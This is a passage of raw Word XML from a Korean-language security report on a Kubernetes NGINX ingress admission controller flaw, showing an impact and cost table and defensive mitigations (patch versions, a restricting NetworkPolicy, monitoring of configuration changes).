      <w:tr w:rsidR="001B086D" w:rsidRPr="001B086D" w14:paraId="419AC842" w14:textId="77777777" w:rsidTr="001B0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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00950AA8" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
            <w:pPr>
              <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시나리오</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2409" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70C67A7D" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D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lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>잠재적 영향 범위</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4111" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0955F4BE" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D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lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B086D">
              <w:rPr>
                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비용 추정(USD)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B086D" w:rsidRPr="001B086D" w14:paraId="707F7C9B" w14:textId="77777777" w:rsidTr="001B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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A015E65" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
            <w:pPr>
              <w:spacing w:after="200" w:line="276" w:lineRule="auto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1B086D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Secrets 유출</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2409" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="518F4166" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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클러스터당 평균 150개 Secrets 노출</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4111" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FCCD7CB" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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$250,000/클러스터</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B086D" w:rsidRPr="001B086D" w14:paraId="467BE142" w14:textId="77777777" w:rsidTr="001B086D">
        <w:trPr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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="65DC3BDE" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
            <w:pPr>
              <w:spacing w:after="200" w:line="276" w:lineRule="auto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1B086D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lastRenderedPageBreak/>
              <w:t>클러스터 장악</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2409" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4CF1B3B3" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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100% 서비스 다운타임</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4111" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F87C420" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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$1.2M/일</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001B086D" w:rsidRPr="001B086D" w14:paraId="46F38881" w14:textId="77777777" w:rsidTr="001B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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="197D6E88" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
            <w:pPr>
              <w:spacing w:after="200" w:line="276" w:lineRule="auto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1B086D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규정 준수 위반(GDPR 등)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2409" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C060ACE" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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최대 벌금 $20M 또는 글로벌 매출의 4%</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4111" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0ED971E8" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086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1B086D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사례에 따라 변동</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17D6CA03" w14:textId="4817B130" w:rsidR="009A035F" w:rsidRPr="009A035F" w:rsidRDefault="009A035F" w:rsidP="009A035F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69C78ED0" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="009A035F" w:rsidP="001B086D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A035F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">6.6 </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위험 완화를 위한 권고</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FCCA07" w14:textId="580F27FD" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>즉각적 패치: v1.11.5/v1.12.1 이상 업그레이드</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261082CC" w14:textId="02CBEB5A" w:rsidR="009A035F" w:rsidRDefault="001B086D" w:rsidP="009A035F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>네트워크 격리</w:t>
      </w:r>
      <w:r w:rsidR="001D7234" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001D7234">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20BCBAC6" wp14:editId="69E78BB1">
                <wp:extent cx="5324475" cy="4136065"/>
                <wp:effectExtent l="0" t="0" r="28575" b="17145"/>
                <wp:docPr id="187956363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413606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26A55" w14:textId="1CDABBEB" w:rsidR="001D7234" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
                            <w:pPr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text</w:t>
                            </w:r>
                            <w:r w:rsidR="001D723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1B086D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# </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="001B086D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NetworkPolicy</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="001B086D">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>로</w:t>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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Admission Controller </w:t>
                            </w:r>
                            <w:r w:rsidRPr="001B086D">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>접근</w:t>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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</w:t>
                            </w:r>
                            <w:r w:rsidRPr="001B086D">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>제한</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="001B086D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apiVersion</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="001B086D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: networking.k8s.io/v1</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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kind: </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="001B086D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NetworkPolicy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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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metadata:</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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 name: restrict-admission</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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spec:</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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 </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="001B086D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podSelector</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="001B086D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:</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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   </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="001B086D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matchLabels</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="001B086D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:</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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     app.kubernetes.io/component: controller</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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 ingress:</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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 - from:</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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   - </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="001B086D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namespaceSelector</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="001B086D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:</w:t>
                            </w:r>
                            <w:r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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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       </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="001B086D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matchLabels</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="001B086D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:</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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 xml:space="preserve">          kubernetes.io/metadata.name: </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="001B086D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kube</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="001B086D">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>-system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BCBAC6" id="_x0000_s1040" style="width:419.25pt;height:32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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="0D126A55" w14:textId="1CDABBEB" w:rsidR="001D7234" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
                      <w:pPr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text</w:t>
                      </w:r>
                      <w:r w:rsidR="001D723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1B086D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# </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>NetworkPolicy</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>로</w:t>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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Admission Controller </w:t>
                      </w:r>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>접근</w:t>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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</w:t>
                      </w:r>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>제한</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>apiVersion</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>: networking.k8s.io/v1</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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kind: </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>NetworkPolicy</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>metadata:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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 name: restrict-admission</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>spec:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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 </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>podSelector</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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   </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>matchLabels</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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     app.kubernetes.io/component: controller</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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 ingress:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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 - from:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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   - </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>namespaceSelector</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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       </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>matchLabels</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>:</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve">          kubernetes.io/metadata.name: </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>kube</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>-system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93712B3" w14:textId="6A138B96" w:rsidR="001B086D" w:rsidRDefault="001B086D" w:rsidP="009A035F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs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lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>모니터링 강화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7EDDE3" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>5분 내 NGINX 설정 변경 탐지</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D8E00D" w14:textId="51BDE41D" w:rsidR="00E27F85" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>디렉티브</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 사용 시 실시간</w:t>
      </w:r>
      <w:r w:rsidR="00B854B5">
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7817F184" w14:textId="35FB9396" w:rsidR="00E27F85" w:rsidRPr="00484D84" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00484D84">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">7. </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대응</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>방안</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
